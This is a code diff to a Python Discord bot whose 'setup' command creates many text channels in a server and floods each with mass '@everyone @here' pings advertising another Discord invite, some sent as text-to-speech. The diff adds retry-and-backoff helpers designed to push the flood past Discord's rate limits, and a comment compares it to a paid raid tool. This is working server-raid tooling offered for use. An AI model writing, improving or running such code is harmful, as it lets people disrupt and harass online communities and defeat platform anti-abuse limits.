@@ -244,6 +244,49 @@ async def removepremium(ctx, user: discord.User):
     else:
         await ctx.send(f"ℹ️ {user.name} does not have premium.")
 
+async def send_with_retry(channel, content=None, embed=None, max_retries=10):
+    """Încearcă să trimită un mesaj sau embed, cu retry la rate-limit și backoff."""
+    retries = 0
+    while retries < max_retries:
+        try:
+            if content is not None and embed is not None:
+                await channel.send(content=content, embed=embed, tts=True)
+            elif content is not None:
+                await channel.send(content=content, tts=True)
+            elif embed is not None:
+                await channel.send(embed=embed)
+            return True
+        except discord.HTTPException as e:
+            if e.status == 429:
+                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
+                wait = retry_after + (retries * 0.5)
+                await asyncio.sleep(wait)
+                retries += 1
+            else:
+                return False
+        except Exception:
+            return False
+    return False
+
+async def create_channel_with_retry(guild, name, max_retries=10):
+    """Creează un canal cu retry la rate-limit și backoff."""
+    retries = 0
+    while retries < max_retries:
+        try:
+            ch = await guild.create_text_channel(name=name)
+            return ch
+        except discord.HTTPException as e:
+            if e.status == 429:
+                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
+                wait = retry_after + (retries * 0.5)
+                await asyncio.sleep(wait)
+                retries += 1
+            else:
+                return None
+        except Exception:
+            return None
+    return None
+
 @bot.command()
 async def setup(ctx):
     guild = ctx.guild
@@ -337,20 +380,22 @@ async def setup(ctx):
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
     async def spam_channel(channel):
-        """Send exactly 25 messages per channel (like Insomnia premium) + embed and big message."""
+        """Trimite big_message, embed și 25 de mesaje spam, cu retry la rate-limit."""
         try:
-            # Send the big message once
-            await channel.send(content=big_message)
-            await asyncio.sleep(0.08)
-            # Send the embed once
-            await channel.send(embed=embed_content)
-            await asyncio.sleep(0.08)
-            # Send 25 spam messages with ping (like Insomnia premium)
+            # Trimite big_message (cu retry)
+            await send_with_retry(channel, content=big_message)
+            await asyncio.sleep(0.1)
+
+            # Trimite embed (cu retry)
+            await send_with_retry(channel, embed=embed_content)
+            await asyncio.sleep(0.1)
+
+            # Trimite 25 de mesaje cu ping (cu retry)
             for _ in range(25):
                 ping_count = random.randint(5, 12)
                 msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
-                await channel.send(content=msg)
-                await asyncio.sleep(0.06)  # small delay to avoid rate-limit
+                await send_with_retry(channel, content=msg)
+                await asyncio.sleep(0.05)
         except Exception:
             pass
 
@@ -361,17 +406,15 @@ async def setup(ctx):
             styled_name = apply_font(base_name, font_style)
             if len(styled_name) > 100:
                 styled_name = base_name
-            ch = await guild.create_text_channel(name=styled_name)
-            created_channels.append(ch)
 
-            # Start spam in background
+            ch = await create_channel_with_retry(guild, styled_name)
+            if ch is None:
+                await user.send(f"⚠️ Failed to create channel {index} after retries.")
+                return
+
+            created_channels.append(ch)
             asyncio.create_task(spam_channel(ch))
 
-        except discord.HTTPException as e:
-            if e.status == 429:
-                await user.send(f"⚠️ Rate limit on channel {index}, continuing...")
-            else:
-                await user.send(f"⚠️ Error on channel {index}: {e}")
         except Exception as e:
             await user.send(f"⚠️ Error on channel {index}: {e}")
 
@@ -379,7 +422,7 @@ async def setup(ctx):
     tasks = [create_and_spam(i) for i in range(total_channels)]
     await asyncio.gather(*tasks)
 
-    await user.send(f"✅ All {len(created_channels)} channels created, spam (25 messages per channel) is running in parallel!")
+    await user.send(f"✅ All {len(created_channels)} channels created, spam (25 messages per channel) is running in parallel with retry on rate-limit!")
 
     # Wait 3 seconds for spam to start
     await asyncio.sleep(3)
